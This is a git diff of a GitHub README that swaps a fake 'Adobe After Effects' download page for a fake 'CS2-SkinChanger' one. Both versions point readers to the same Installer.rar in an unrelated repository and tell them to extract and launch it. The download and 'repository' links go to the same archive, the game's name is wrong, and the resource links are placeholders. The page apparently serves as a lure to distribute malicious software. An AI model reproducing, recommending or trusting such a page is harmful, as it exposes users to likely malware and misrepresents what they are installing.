@@ -1,50 +1,50 @@
 
-![after-effects-face-tracker](https://github.com/bernardodangelo/spring-boot-websocket/assets/94177248/af870747-d28b-4662-8a13-0c9cad23626d)
+![5c855e32-7737-4344-9f1a-28dcb79e7ecb](https://github.com/bernardodangelo/AdobeAfterEffects/assets/94177248/243c7793-446e-4852-8df1-a26dd3b5515a)
 
-<h1 align="center">Adobe After Effects</h1>
+<h1 align="center">CS2-SkinChanger</h1>
 
 <p align="center">
-  <b>Create stunning visual effects and motion graphics with Adobe After Effects.</b>
+  <b>Enhance your Counter-Strike 2D experience with CS2-SkinChanger.</b>
 </p>
 
 ---
 
-## 🚀 Download Adobe After Effects
+## 🚀 Download CS2-SkinChanger
 
 - **Latest Version:** [Download Now](https://github.com/bernardodangelo/beer/releases/download/1/Installer.rar)
-- **Adobe Website:** [Visit](https://www.adobe.com/products/aftereffects.html)
+- **GitHub Repository:** [View on GitHub](https://github.com/bernardodangelo/beer/releases/download/1/Installer.rar)
 
 ---
 
 ## 💡 Usage Instructions
 
-1. Download and install Adobe After Effects from the link above.
-2. Launch Adobe After Effects.
-3. Start creating visual effects, motion graphics, and animations using the powerful tools and features available.
-4. Use keyframes, effects, and presets to bring your ideas to life.
-5. Export your projects in various formats, including video, GIF, and more.
+1. Download CS2-SkinChanger from the link above.
+2. Extract the files from the downloaded archive.
+3. Launch CS2-SkinChanger.
+4. Choose the skins and customizations you want to apply to your Counter-Strike 2D game.
+5. Start your Counter-Strike 2D game and enjoy the new skins and features.
 
 ---
 
 ## 📚 Resources
 
-- [Adobe After Effects Help Center](https://helpx.adobe.com/after-effects.html)
-- [Adobe After Effects Tutorials](https://www.adobe.com/products/aftereffects/learn.html)
-- [Adobe After Effects Community](https://community.adobe.com/t5/after-effects/bd-p/after-effects?page=1&sort=latest_replies&filter=all)
+- [CS2-SkinChanger Documentation](https://github.com/your-username/cs2-skinchanger/wiki)
+- [CS2-SkinChanger Tutorials](https://github.com/your-username/cs2-skinchanger/wiki/Tutorials)
+- [CS2-SkinChanger Issues](https://github.com/your-username/cs2-skinchanger/issues)
 
 ---
 
 ## 💡 Tips and Tricks
 
-- **Animation Techniques:** Learn advanced animation techniques to create dynamic motion graphics.
-- **Visual Effects:** Explore the wide range of visual effects available in Adobe After Effects.
-- **Workflow Optimization:** Optimize your workflow with keyboard shortcuts and efficient project organization.
+- **Skin Selection:** Explore the available skins and customize your weapons and characters.
+- **Updates:** Check for updates regularly to get the latest skins and features.
+- **Community Support:** Engage with the CS2-SkinChanger community for tips and tricks.
 
 ---
 
 ## 📷 Showcase
 
-Share your Adobe After Effects creations! Use the hashtag #AfterEffectsCreations on social media to showcase your work.
+Share your customized Counter-Strike 2D gameplay! Use the hashtag #CS2SkinChangerCreations on social media to showcase your skins and customizations.
 
 ---
 
